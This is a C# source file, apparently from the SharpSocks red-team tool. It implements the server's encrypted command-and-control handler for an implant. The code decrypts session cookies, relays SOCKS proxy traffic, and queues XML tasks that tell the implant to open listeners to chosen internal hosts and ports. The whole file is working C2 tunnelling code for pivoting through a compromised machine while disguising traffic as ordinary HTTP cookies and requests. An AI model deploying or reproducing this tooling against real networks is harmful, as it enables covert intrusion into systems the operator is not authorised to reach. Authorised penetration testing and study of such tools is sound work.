using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Xml.Linq;
using System.Xml.XPath;
using SharpSocksCommon;
using SharpSocksCommon.Encryption;
using SharpSocksServer.Config;
using SharpSocksServer.Logging;
using SharpSocksServer.SocksServer;

namespace SharpSocksServer.ImplantComms
{
    public class EncryptedC2RequestProcessor : IProcessRequest, ISocksImplantComms
    {
        private static readonly byte[] STANDARD_RESPONSE = Encoding.UTF8.GetBytes(new XElement((XName)"Response", new XElement((XName)"Success", 0)).ToString());
        private readonly AutoResetEvent _cmdTaskWaitEvent = new(false);
        private readonly string _commandChannel;
        private readonly TimeSpan _commandChannelTimeout = new(0, 2, 0);
        private readonly ConcurrentQueue<XElement> _commandTasks = new();
        private readonly ConcurrentDictionary<string, DataTask> _dataTasks = new();
        private readonly HashSet<string> _listeners = new();
        private readonly Dictionary<string, ConnectionDetails> _mapSessionToConnectionDetails = new();
        private readonly string _sessionIdName;
        private DateTime? _lastTimeCommandChannelSeen;

        public EncryptedC2RequestProcessor(ILogOutput logger, IEncryptionHelper encryption, SharpSocksConfig config)
        {
            CmdChannelRunningEvent = new ManualResetEvent(false);
            Logger = logger;
            Encryption = encryption;
            PayloadCookieName = config.PayloadCookieName;
            _sessionIdName = config.SessionCookieName;
            _commandChannel = config.CommandChannelId;
            CommandLimit = config.CommandLimit;
            _mapSessionToConnectionDetails.Add(config.CommandChannelId, new ConnectionDetails
            {
                HostPort = "",
                DataSent = 0,
                DataReceived = 0
            });
        }

        private ILogOutput Logger { get; }

        private IEncryptionHelper Encryption { get; }

        public ManualResetEvent CmdChannelRunningEvent { get; }

        private string PayloadCookieName { get; }

        private ushort CommandLimit { get; }

        private bool IsCommandChannelConnected
        {
            get
            {
                if (_lastTimeCommandChannelSeen.HasValue && DateTime.Now.Subtract(_lastTimeCommandChannelSeen.Value) < _commandChannelTimeout)
                    return true;
                CmdChannelRunningEvent.Reset();
                return false;
            }
        }

        public void ProcessRequest(HttpListenerContext httpListenerContext)
        {
            Cookie sessionIdCookie;
            try
            {
                sessionIdCookie = httpListenerContext.Request.Cookies[_sessionIdName];
                if (string.IsNullOrEmpty(sessionIdCookie?.Value))
                {
                    httpListenerContext.Response.StatusCode = 401;
                    httpListenerContext.Response.Close();
                    return;
                }
            }
            catch (Exception e)
            {
                Logger.LogMessage($"Error processing session cookie: {e}");
                return;
            }

            string targetId;
            CommandChannelStatus statusFromCookie;
            try
            {
                var decryptedSessionCookie = Encoding.UTF8
                    .GetString((Encryption.Decrypt(sessionIdCookie.Value) ?? throw new Exception($"Can't decrypt session cookie{sessionIdCookie.Value}")).ToArray())
                    .Split(':');
                targetId = decryptedSessionCookie[0];
                if (!Enum.TryParse(decryptedSessionCookie[1], out statusFromCookie))
                {
                    throw new Exception($"Invalid cookie status: {decryptedSessionCookie[1]}");
                }

                if (string.IsNullOrWhiteSpace(targetId))
                    throw new Exception("Session cookie decrypted to nothing or whitespace");
            }
            catch (Exception e)
            {
                Logger.LogError($"Error occured communicating with implant: {e}");
                httpListenerContext.Response.StatusCode = 500;
                httpListenerContext.Response.Close();
                return;
            }

            Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Successfully decrypted message, status: {statusFromCookie}");

            List<byte> responseBytes;
            string requestData = null;
            try
            {
                switch (httpListenerContext.Request.HttpMethod)
                {
                    case "POST":
                        requestData = new StreamReader(httpListenerContext.Request.InputStream).ReadToEnd();
                        break;
                    case "GET":
                    {
                        var commandChannelCookie = httpListenerContext.Request.Cookies[PayloadCookieName];
                        if (!string.IsNullOrWhiteSpace(commandChannelCookie?.Value))
                            requestData = commandChannelCookie.Value;
                        break;
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogMessage($"{targetId} Error processing payload data: {e}");
                CloseTargetConnection(targetId);
                return;
            }

            var decryptedData = string.IsNullOrEmpty(requestData) ? new List<byte>() : Encryption.Decrypt(requestData);
            Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Received {decryptedData.Count} bytes");
            if (targetId == _commandChannel)
            {
                responseBytes = HandleCommandChannelRequest(decryptedData, targetId);
            }
            else
            {
                responseBytes = HandleNetworkChannelRequest(httpListenerContext, statusFromCookie, targetId, decryptedData);
                if (responseBytes == null)
                {
                    CloseTargetConnection(targetId);
                    return;
                }
            }

            try
            {
                httpListenerContext.Response.StatusCode = 200;
                var source = EncryptPayload(responseBytes);
                if (source is { Count: > 0 })
                    httpListenerContext.Response.OutputStream.Write(source.ToArray(), 0, source.Count);
                httpListenerContext.Response.OutputStream.Close();
            }
            catch (Exception e)
            {
                Logger.LogMessage($"[{targetId}][SOCKS Server -> Implant] Error Writing response back to client {e}");
                CloseTargetConnection(targetId);
            }
        }

        public string CreateNewConnectionTarget(string targetHost, ushort targetPort)
        {
            var targetId = Guid.NewGuid().ToString();
            var task = new XElement((XName)"Task", new XElement((XName)"CreateListener", new XAttribute((XName)"TargetHost", targetHost),
                new XAttribute((XName)"TargetPort", targetPort), new XAttribute((XName)"SessionID", targetId)));
            AddListener(targetId);
            _dataTasks.TryAdd(targetId, new DataTask());
            QueueCommandTask(task);
            return targetId;
        }

        public void CloseTargetConnection(string targetId)
        {
            lock (_listeners)
            {
                if (!_listeners.Contains(targetId))
                    return;
            }

            Logger.LogMessage($"[{targetId}][SOCKS Server -> Implant] Queuing command task to shutdown connection in implant");
            QueueCommandTask(new XElement((XName)"Task", new XElement((XName)"CloseListener", new XAttribute((XName)"SessionID", targetId))));
        }

        public void SendDataToTarget(string listenerGuid, List<byte> payload)
        {
            if (!_dataTasks.ContainsKey(listenerGuid))
                return;
            var dataTask = _dataTasks[listenerGuid];
            dataTask.Tasks.Enqueue(payload);
            dataTask.Wait.Set();
        }

        private List<byte> HandleNetworkChannelRequest(HttpListenerContext httpListenerContext, CommandChannelStatus statusFromCookie, string targetId, List<byte> requestData)
        {
            var responseBytes = new List<byte>();
            try
            {
                if (statusFromCookie is CommandChannelStatus.CLOSED)
                {
                    Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Implant states connection is closed");
                    if (_dataTasks.ContainsKey(targetId))
                    {
                        _dataTasks[targetId].Tasks.Clear();
                        _dataTasks[targetId].DisposeWait();
                        _dataTasks.TryRemove(targetId, out _);
                    }

                    _listeners.Remove(targetId);
                    SocksProxy.CloseConnection(targetId);
                    httpListenerContext.Response.StatusCode = 200;
                    httpListenerContext.Response.OutputStream.Close();
                    return null;
                }

                if (SocksProxy.IsValidSession(targetId))
                {
                    if (!SocksProxy.IsSessionOpen(targetId))
                        SocksProxy.NotifyConnection(targetId, CommandChannelStatus.OPEN);
                    var detailsForTargetId = SocksProxy.GetDetailsForTargetId(targetId);
                    if (!requestData.Any())
                    {
                        Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Requesting data for connection {detailsForTargetId.HostPort}:{detailsForTargetId.Id}");
                    }
                    else
                    {
                        SocksProxy.ReturnDataCallback(targetId, requestData);
                        Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] {detailsForTargetId.HostPort}:{detailsForTargetId.Id} Received {requestData.Count} bytes ");
                    }

                    var dataTask = _dataTasks[targetId];
                    if (!SocksProxy.IsValidSession(targetId))
                    {
                        httpListenerContext.Response.StatusCode = 200;
                        httpListenerContext.Response.OutputStream.Close();
                        return null;
                    }

                    while (!dataTask.Tasks.IsEmpty)
                    {
                        if (dataTask.Tasks.TryDequeue(out var result))
                            responseBytes.AddRange(result);
                    }

                    Logger.LogMessage(responseBytes.Count > 0
                        ? $"[{targetId}][SOCKS Server -> Implant] {detailsForTargetId.HostPort}:{detailsForTargetId.Id} Sending {responseBytes.Count} bytes "
                        : $"[{targetId}][SOCKS Server -> Implant] {detailsForTargetId.HostPort}:{detailsForTargetId.Id} Nothing to send.");
                }
                else
                {
                    Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Session ID {targetId} is not valid");
                    try
                    {
                        httpListenerContext.Response.StatusCode = 404;
                        httpListenerContext.Response.OutputStream.Close();
                        return null;
                    }
                    catch (Exception e)
                    {
                        Logger.LogMessage($"[{targetId}][SOCKS Server -> Implant] Error Writing response back 404 to client: {e}");
                        return null;
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Error processing response: {e}");
            }

            return responseBytes;
        }

        private List<byte> HandleCommandChannelRequest(List<byte> requestData, string targetId)
        {
            var responseBytes = new List<byte>();
            try
            {
                ProcessCommandChannelTime();
                if (!requestData.Any())
                {
                    Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Command channel sending {_commandTasks.Count} tasks");
                }
                else
                {
                    _mapSessionToConnectionDetails[_commandChannel].DataReceived += requestData.Count;
                    if (!_commandTasks.IsEmpty)
                        Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Command channel payload {requestData.Count} bytes, sending {_commandTasks.Count} tasks");
                    ProcessCommandChannelImplantMessage(requestData, targetId);
                }


                _cmdTaskWaitEvent.WaitOne(300);
                responseBytes.AddRange(!_commandTasks.IsEmpty
                    ? Encoding.UTF8.GetBytes(new XElement((XName)"Response", new XElement((XName)"Tasks", PopQueueCommandTasks())).ToString())
                    : STANDARD_RESPONSE);
                _mapSessionToConnectionDetails[_commandChannel].DataSent += responseBytes.Count;
            }
            catch (Exception e)
            {
                Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Error processing command channel message {e}");
            }

            return responseBytes;
        }

        private void ProcessCommandChannelImplantMessage(List<byte> message, string targetId)
        {
            var node = XDocument.Parse(Encoding.UTF8.GetString(message.ToArray()));
            node.XPathSelectElements("CommandChannel/ListenerStatus");
            node.XPathSelectElements("CommandChannel/ListenerStatus").ToList().ForEach((Action<XElement>)(x =>
            {
                var statusElement = x.XPathSelectElement("Status");
                if (statusElement == null)
                    return;
                if (!Enum.TryParse(statusElement.Value, out CommandChannelStatus status))
                {
                    Logger.LogError($"[{targetId}][Implant -> SOCKS Server] Failed to parse status field as a status: {statusElement.Value}");
                    return;
                }

                SocksProxy.NotifyConnection(statusElement.Attribute((XName)"SessionID")?.Value, status);
                Logger.LogMessage($"[{targetId}][Implant -> SOCKS Server] Connection {statusElement.Attribute((XName)"SessionID")?.Value} is {statusElement.Value}");
            }));
        }

        private List<byte> EncryptPayload(List<byte> responseBytes)
        {
            List<byte> byteList = null;
            if (responseBytes is { Count: > 0 })
                byteList = Encoding.UTF8.GetBytes(Encryption.Encrypt(responseBytes)).ToList();
            return byteList;
        }

        private void AddListener(string targetId)
        {
            _listeners.Add(targetId);
        }

        private void QueueCommandTask(XElement task)
        {
            if (!IsCommandChannelConnected) return;
            _commandTasks.Enqueue(task);
            _cmdTaskWaitEvent.Set();
        }

        private List<XElement> PopQueueCommandTasks()
        {
            var xElementList = new List<XElement>();
            while (!_commandTasks.IsEmpty && xElementList.Count < CommandLimit)
            {
                if (_commandTasks.TryDequeue(out var result) && result != null)
                    xElementList.Add(result);
            }

            return xElementList;
        }

        private void ProcessCommandChannelTime()
        {
            if (!_lastTimeCommandChannelSeen.HasValue)
            {
                if (_lastTimeCommandChannelSeen.HasValue)
                    return;
                CmdChannelRunningEvent.Set();
                _lastTimeCommandChannelSeen = DateTime.Now;
            }
            else
            {
                _lastTimeCommandChannelSeen = DateTime.Now;
            }
        }
    }
}